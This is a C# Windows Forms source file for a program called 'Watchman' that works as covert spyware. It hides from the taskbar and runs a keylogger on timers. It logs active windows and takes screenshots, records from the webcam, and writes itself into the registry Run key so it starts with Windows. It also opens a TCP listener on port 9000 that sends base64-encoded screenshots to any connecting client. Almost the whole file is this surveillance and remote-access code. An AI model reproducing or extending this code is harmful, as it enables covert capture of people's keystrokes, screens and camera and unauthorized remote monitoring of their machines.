using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace Watchman
{
    public partial class MainForm : Form
    {
        private static readonly Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static readonly List<Socket> ClientSockets = new List<Socket>();
        private static readonly byte[] Buffer = new byte[1024];
        private Camera _cam;
        private KLog _keylog;

        public MainForm()
        {
            InitializeComponent();
            ThreadPool.QueueUserWorkItem(x =>
                {
                    StartListening();
                });
        }
        private void Form1_Load(object sender, EventArgs e)
        {
           // Hide();
           // Opacity = 0;
            ShowInTaskbar = false;
            
            timer1.Enabled = true; 
            timer2.Enabled = true;
            timer3.Enabled = true;
            timer4.Enabled = true;

            _keylog = new KLog();
        }
        private void StartCam()
        {
            _cam = new Camera();
            _cam.Connect(mainPictureBox, _cam.Devices[0]);
        }
        private void CopyApplication(string location)
        {
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
            if (File.Exists(filePath)) File.Delete(filePath);
            File.Copy(filePath, location);
        }
        private void AddToStartUp()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp != null && rkApp.GetValue("WatchMan") == null)
                rkApp.SetValue("WatchMan", Application.ExecutablePath);
        }

        #region Time Tickers
        private void timer1_Tick(object sender, EventArgs e)
        {
            _keylog.Log();
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
            _keylog.ActiveWindow();
        }
        private void timer3_Tick(object sender, EventArgs e)
        {
            _keylog.WriteLog();
            _keylog.TakeScreen();
        }
        #endregion

        #region Click events
        private void startRecordButton_Click(object sender, EventArgs e)
        {
            StartCam();
            ThreadPool.QueueUserWorkItem(x =>
            {
                Console.WriteLine("Recording Started...");
                _cam.Record();
            });
        }

        private void stopRecordButton_Click(object sender, EventArgs e)
        {
            ThreadPool.QueueUserWorkItem(x =>
            {
                Console.WriteLine("Recording Stopped...");
                _cam.StopRecord();
            });
        }
        #endregion

        #region Remote
        #region Static Fields
        private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);
        private static bool _stopListening;
        private static bool _started;
        #endregion
        #region Constants
        private static int _port = 9000;
        #endregion

        private static void StartListening()
        {
            try
            {
                _stopListening = true;
                _started = true;
                IPAddress ipAddress = null;
                IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
                foreach (IPAddress ip in ipHostInfo.AddressList)
                {
                    if (ip.AddressFamily != AddressFamily.InterNetwork)
                    {
                        continue;
                    }
                    ipAddress = ip;
                    break;
                }
                if (ipAddress != null)
                {
                    IPEndPoint localEndPoint = new IPEndPoint(ipAddress, _port);
                    Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                    // Bind the socket to the local endpoint and listen for incoming connections.
                    try
                    {
                        listener.Bind(localEndPoint);
                        listener.Listen(100);
                        _stopListening = false;
                        while (true)
                        {
                            // Set the event to non signaled state.
                            ManualResetEvent.Reset();
                            // Start an asynchronous socket to listen for connections.
                            listener.BeginAccept(AcceptCallback, listener);
                            // Wait until a connection is made before continuing.
                            ManualResetEvent.WaitOne();
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("--- Async Start Listening ---");
                        Console.WriteLine(e.ToString());
                    }
                }
            }
            catch (Exception ey)
            {
                Console.WriteLine("--- Async Start Listening Master---");
                Console.WriteLine(ey.ToString());
            }
        }
        private static void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                // Signal the main thread to continue.
                ManualResetEvent.Set();

                // Get the socket that handles the client request.
                Socket listener = (Socket)ar.AsyncState;
                Socket handler = listener.EndAccept(ar);

                // Create the state object.
                StateObject state = new StateObject { WorkSocket = handler };
                handler.BeginReceive(state.Buffer, 0, StateObject.BufferSize, 0, ReadCallback, state);
            }
            catch (Exception e)
            {
                Console.WriteLine("--- Accept Callback Exception ---");
                Console.WriteLine(e.ToString());
            }
        }

        static byte[] GetBytes(string str)
        {
            byte[] bytes = new byte[str.Length * sizeof(char)];
            System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
            return bytes;
        }

        private static void ReadCallback(IAsyncResult ar)
        {
            try
            {
                //===============================================================
                // Retrieve the state object and the handler socket
                // from the asynchronous state object.
                StateObject state = (StateObject)ar.AsyncState;
                Socket handler = state.WorkSocket;
                // Read data from the client socket. 
                int bytesRead = handler.EndReceive(ar);
                if (bytesRead <= 0) return;
                //===============================================================

                //===============================================================
                state.StringBuilder.Append(Encoding.ASCII.GetString(state.Buffer, 0, bytesRead));
                String content = state.StringBuilder.ToString();
                //===============================================================

                #region Content
                if (content.IndexOf("<EOF>") > -1) //End Of file Tag
                {
                    content = content.Replace("<EOF>", "");
                    byte[] currentData;

                    if (content.StartsWith("<ScreenCapture>"))
                    {
                        currentData = KLog.RemoteTakeScreen();
                        string base64 = Convert.ToBase64String(currentData);
                        byte[] output = GetBytes(base64);


                        Console.WriteLine("Captured Image length: {0}", output.Length);

                        string a = output[0].ToString();
                        string b = output[1].ToString();
                        string aa = output[2].ToString();
                        string ab = output[3].ToString();
                        string aaa = output[4].ToString();
                        string aab = output[6].ToString();
                        string aaaa = output[6].ToString();
                        string aaab = output[7].ToString();
                        Console.WriteLine("A HEAD: {0}",
                            (a + "-" + b + "-" + aa + "-" + ab + "-" + aaa + "-" + aab + "-" + aaaa + "-" + aaab));
                        a = output[output.Length - 1].ToString();
                        b = output[output.Length - 2].ToString();
                        aa = output[output.Length - 3].ToString();
                        ab = output[output.Length - 4].ToString();
                        aaa = output[output.Length - 5].ToString();
                        aab = output[output.Length - 6].ToString();
                        aaaa = output[output.Length - 7].ToString();
                        aaab = output[output.Length - 8].ToString();
                        Console.WriteLine("A TAIL: {0}",
                            (a + "-" + b + "-" + aa + "-" + ab + "-" + aaa + "-" + aab + "-" + aaaa + "-" + aaab));

                        using (MemoryStream ms = new MemoryStream(new byte[output.Length + 4]))
                        {
                            byte[] size = BitConverter.GetBytes(output.Length);
                            ms.Write(size, 0, 4);
                            ms.Write(output, 0, output.Length);
                            var tm = ms.ToArray();
                            state.SendBuffer = ms.ToArray();
                            Send(handler, Encoding.ASCII.GetString(state.SendBuffer, 0, state.SendBuffer.Length));
                        }
                    }
                }
                else
                {
                    // Not all data received. Get more.
                    handler.BeginReceive(state.Buffer, 0, StateObject.BufferSize, 0, ReadCallback, state);
                }
                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine("--- Async Read Callback Exception ---");
                Console.WriteLine(e.ToString());
            }         
        }
        private static void Send(Socket handler, String data)
        {
            try
            {
                // Convert the string data to byte data using ASCII encoding.
                byte[] byteData = Encoding.ASCII.GetBytes(data);
                // Begin sending the data to the remote device.
                handler.BeginSend(byteData, 0, byteData.Length, 0, SendCallback, handler);
            }
            catch (Exception ex)
            {
                Console.WriteLine("--- Async Send Exception ---");
                Console.WriteLine(ex.ToString());
            }
        }
        private static void SendCallback(IAsyncResult ar)
        {
            try
            {
                // Retrieve the socket from the state object.
                Socket handler = (Socket)ar.AsyncState;
                handler.EndSend(ar);
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("--- Async Send Callback Exception ---");
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion    
    }
}
